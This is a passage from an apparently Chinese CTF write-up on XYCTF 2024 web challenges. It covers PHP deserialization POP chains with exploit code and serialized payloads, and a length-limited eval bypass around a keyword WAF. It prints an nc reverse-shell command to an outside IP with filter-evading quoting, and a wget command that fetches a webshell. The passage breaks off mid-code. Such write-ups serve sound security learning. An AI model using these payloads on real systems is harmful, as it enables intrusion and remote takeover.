+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$a-&gt;password = &amp;$a-&gt;token;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后续让token等于md5加密随机数，password也会直接等于token</p>
+<p><img src="/p/xyctf2024/image-20250830192824320.png"
+	width="1107"
+	height="547"
+	srcset="/p/xyctf2024/image-20250830192824320_hu16716829314715622576.png 480w, /p/xyctf2024/image-20250830192824320_hu11396152849135783044.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250830192824320"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="485px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">fpclosefpclosefpcloseffflllaaaggg</span><span class="o">.</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$mack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mack</span><span class="o">-&gt;</span><span class="na">nonExistentMethod</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">B</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$luo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;o.O&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">luo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$wang1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$wang1</span><span class="p">,</span><span class="nv">$wang2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">D</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$lao</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$chen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;O.o&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">is_null</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">-&gt;</span><span class="na">chen</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&#34;&#34;</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">-&gt;</span><span class="na">chen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">E</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;xxxxx&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$num</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;学到就是赚到!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">!=</span><span class="s1">&#39;&#39;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">num</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;旅行者别忘记旅行的意义!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>很基础的链子，值得一提的是有wakeup的话会优先调用这个函数，而不是unserialize</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//记得把name的值调为空
+</span></span><span class="line"><span class="cl">$a = new E();
+</span></span><span class="line"><span class="cl">$a -&gt; num = new D();
+</span></span><span class="line"><span class="cl">$a -&gt; num -&gt; lao = new B();
+</span></span><span class="line"><span class="cl">$a -&gt; num -&gt; lao -&gt; luo = new A();
+</span></span><span class="line"><span class="cl">$a -&gt; num -&gt; lao -&gt; luo -&gt; mack = new C();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250830194656372.png"
+	width="1437"
+	height="808"
+	srcset="/p/xyctf2024/image-20250830194656372_hu511167534213423122.png 480w, /p/xyctf2024/image-20250830194656372_hu12198104437302250153.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250830194656372"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="426px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// flag.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">XYCTFNO1</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Liu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$T1ng</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$upsw1ng</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$Liu</span><span class="p">,</span> <span class="nv">$T1ng</span><span class="p">,</span> <span class="nv">$upsw1ng</span> <span class="o">=</span> <span class="nx">Showmaker</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Liu</span> <span class="o">=</span> <span class="nv">$Liu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">T1ng</span> <span class="o">=</span> <span class="nv">$T1ng</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">upsw1ng</span> <span class="o">=</span> <span class="nv">$upsw1ng</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO2</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$crypto0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$adwa</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$crypto0</span><span class="p">,</span> <span class="nv">$adwa</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">crypto0</span> <span class="o">=</span> <span class="nv">$crypto0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">XYCTF</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">adwa</span><span class="o">-&gt;</span><span class="na">crypto0</span> <span class="o">!=</span> <span class="s1">&#39;dev1l&#39;</span> <span class="k">or</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">adwa</span><span class="o">-&gt;</span><span class="na">T1ng</span> <span class="o">!=</span> <span class="s1">&#39;yuroandCMD258&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO3</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$KickyMu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$fpclose</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$N1ght</span> <span class="o">=</span> <span class="s2">&#34;Crypto0&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$KickyMu</span><span class="p">,</span> <span class="nv">$fpclose</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">KickyMu</span> <span class="o">=</span> <span class="nv">$KickyMu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fpclose</span> <span class="o">=</span> <span class="nv">$fpclose</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">XY</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">N1ght</span> <span class="o">==</span> <span class="s1">&#39;oSthing&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;WOW, You web is really good!!!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="k">new</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;X&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Y&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">KickyMu</span><span class="o">-&gt;</span><span class="na">XYCTF</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">XY</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后一层， <code>echo new $_POST['X']($_POST['Y']);</code>明显是利用原生类的，然后是链子的构造</p>
+<p><code>if ($this-&gt;adwa-&gt;crypto0 != 'dev1l' or $this-&gt;adwa-&gt;T1ng != 'yuroandCMD258')</code>这一层条件需要让adwa同时拥有两个不同类的属性，其实自己改一下就行，需要对序列化，反序列化更了解一点。</p>
+<p>还有一些小绕过，读文件是用SplFileObject + php伪协议，具体exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// flag.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">XYCTFNO1</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$crypto0</span> <span class="o">=</span> <span class="s2">&#34;dev1l&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$T1ng</span> <span class="o">=</span> <span class="s2">&#34;yuroandCMD258&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO2</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$crypto0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$adwa</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO3</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$KickyMu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$fpclose</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$N1ght</span> <span class="o">=</span> <span class="s2">&#34;oSthing&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XYCTFNO3</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">KickyMu</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XYCTFNO2</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">KickyMu</span> <span class="o">-&gt;</span> <span class="na">adwa</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XYCTFNO1</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//O:8:&#34;XYCTFNO3&#34;:3:{s:7:&#34;KickyMu&#34;;O:8:&#34;XYCTFNO2&#34;:2:{s:7:&#34;crypto0&#34;;N;s:4:&#34;adwa&#34;;O:8:&#34;XYCTFNO1&#34;:2:{s:7:&#34;crypto0&#34;;s:5:&#34;dev1l&#34;;s:4:&#34;T1ng&#34;;s:13:&#34;yuroandCMD258&#34;;}}s:7:&#34;fpclose&#34;;N;s:5:&#34;N1ght&#34;;s:7:&#34;oSthing&#34;;}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xyctf2024/image-20250830200954722.png"
+	width="2355"
+	height="625"
+	srcset="/p/xyctf2024/image-20250830200954722_hu6939331913033197748.png 480w, /p/xyctf2024/image-20250830200954722_hu410209179357072111.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250830200954722"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="376"
+		data-flex-basis="904px"
+	
+></p>
+<h2 id="牢牢记住逝者为大">牢牢记住，逝者为大
+</h2><h3 id="知识点wage远程下载木马nc反弹shell">知识点：wage远程下载木马、nc反弹shell
+</h3><p><img src="/p/xyctf2024/image-20250905172439469.png"
+	width="1288"
+	height="837"
+	srcset="/p/xyctf2024/image-20250905172439469_hu14740892182799812707.png 480w, /p/xyctf2024/image-20250905172439469_hu14284928717907660848.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250905172439469"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="153"
+		data-flex-basis="369px"
+	
+></p>
+<p>限长，考虑用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`$_GET[1]`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后eval的内容被注释了（单行注释）我们需要用换行符%0a绕过</p>
+<p>此外我们还需要添加一个<code>#</code>（%23）用于注释掉后面的内容，再加一个<code>;</code>，算上前面限长要利用的，一共十三个字符不多不少。</p>
+<p>构造出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%0a`$_GET[b]`;%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>本来到这里就已经成功了，但是还有一个waf在</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$val_name</span> <span class="o">=&gt;</span> <span class="nv">$val_val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&#34;</span><span class="p">,</span> <span class="nv">$val_val</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;what can i say&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>foreach (... as $val_name =&gt; $val_val)</code>：这是一个循环语句，用于遍历 <code>$_GET</code> 数组中的每一个元素。</p>
+<p>也就是说，我们用get传的1也会被这层waf拦下。（改用POST会超字数）</p>
+<p>然后就是如何绕过这层waf</p>
+<p>因为get有许多限制，可以直接用wget远程下载文件写马或者nc 反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=%0a`$_GET[1]`;%23&amp;1=nc 148.135.82.190 8888 -e /bi&#39;&#39;n/sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?b=wget -O ./she.php ip:port/she&amp;cmd=%0a`$_GET[b]`;%23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解释一下wget</p>
+<p><img src="/p/xyctf2024/image-20250905182415781.png"
+	width="1296"
+	height="484"
+	srcset="/p/xyctf2024/image-20250905182415781_hu7636008068010410565.png 480w, /p/xyctf2024/image-20250905182415781_hu5902284677123853120.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250905182415781"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="267"
+		data-flex-basis="642px"
+	
+></p>
+<p>这里本来用内网穿透直接连上虚拟机的，但是内网穿透的域名里有被ban的字母，用云服务器又遇到了很多问题，这里先搁置一下。</p>
+<p>搞了很久，最后解决了，有几个要点。</p>
+<p>首先，你的云服务器的安全组需要添加规则，打开一些端口，我打开的是9999</p>
+<p>然后需要起一个http服务，不然wget连不上。</p>
+<p>这里可以用python启</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
